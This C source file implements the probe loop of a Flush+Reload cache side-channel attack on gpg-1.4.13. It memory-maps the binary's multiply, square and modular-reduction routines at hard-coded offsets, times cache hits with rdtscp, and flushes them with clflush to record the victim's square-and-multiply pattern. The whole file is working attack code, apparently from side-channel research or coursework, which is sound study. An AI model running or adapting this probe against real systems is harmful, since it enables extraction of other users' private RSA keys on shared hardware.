#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include "logger/logger.h"
#ifdef __linux__
#include <sched.h>
#endif

typedef uint8_t byte;

void probe(uint64_t threshhold, char *path, uint64_t *mul_timings, uint64_t *sqr_timings, uint64_t *mod_timings, uint64_t SLOTS);

const unsigned int MUL_OFFSET = 0x8f67d;
const unsigned int SQR_OFFSET = 0x8fc89;
const unsigned int MOD_OFFSET = 0x8ed5c;

static inline uint64_t rdtsc()
{
    uint64_t a, d;
    asm volatile("mfence");
    asm volatile("rdtsc"
                 : "=a"(a), "=d"(d));
    a = (d << 32) | a;
    asm volatile("mfence");
    return a;
}

static inline int memaccesstime(void *v)
{
    int rv;
    asm volatile(
        "mfence\n"
        "lfence\n"
        "rdtscp\n"
        "mov %%eax, %%esi\n"
        "mov (%1), %%eax\n"
        "rdtscp\n"
        "clflush 0(%1)\n"
        "sub %%esi, %%eax\n"
        : "=&a"(rv)
        : "r"(v)
        : "ecx", "edx", "esi");
    return rv;
}

void probe(uint64_t threshhold, char *path, uint64_t *mul_timings, uint64_t *sqr_timings, uint64_t *mod_timings, uint64_t SLOTS)
{
    const unsigned long SLOT_TIME = 1500;
    /*
        Waiting for threshhold
    */
    int fd = open(path, O_RDONLY);
    if (fd == -1)
    {
        perror("Failed to open gpg-1.4.13");
    }
    byte *mul_fn_addr = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, MUL_OFFSET & ~(sysconf(_SC_PAGE_SIZE) - 1));
    byte *sqr_fn_addr = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, SQR_OFFSET & ~(sysconf(_SC_PAGE_SIZE) - 1));
    byte *mod_fn_addr = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, MOD_OFFSET & ~(sysconf(_SC_PAGE_SIZE) - 1));
    close(fd);
    if (mul_fn_addr == (void *)-1 || sqr_fn_addr == (void *)-1 || mod_fn_addr == (void *)-1)
    {
        perror("Failed to memory map the offsets of the functions in gpg");
    }
    printf(BOLD(RED("Scanning...")));
    fflush(stdout);
    while (1)
    {
        uint64_t start_time = rdtsc();
        const uint64_t finish_time = start_time + SLOT_TIME;
        uint64_t mul_time = memaccesstime(mul_fn_addr);
        uint64_t sqr_time = memaccesstime(sqr_fn_addr);
        uint64_t mod_time = memaccesstime(mod_fn_addr);
        if (mul_time < threshhold || sqr_time < threshhold || mod_time < threshhold)
        {
            printf("\r" BOLD(GRN("Threshhold triggered!")) "\n");
            mul_timings[0] = mul_time;
            sqr_timings[0] = sqr_time;
            mod_timings[0] = mod_time;
            break;
        }
        while (start_time < finish_time)
        {
            start_time = rdtsc();
        }
    }
    for (uint64_t i = 1; i < SLOTS; ++i)
    {
        uint64_t start_time = rdtsc();
        const uint64_t finish_time = start_time + SLOT_TIME;
        mul_timings[i] = memaccesstime(mul_fn_addr);
        sqr_timings[i] = memaccesstime(sqr_fn_addr);
        mod_timings[i] = memaccesstime(mod_fn_addr);
        while (start_time < finish_time)
        {
            start_time = rdtsc();
        }
    }
}
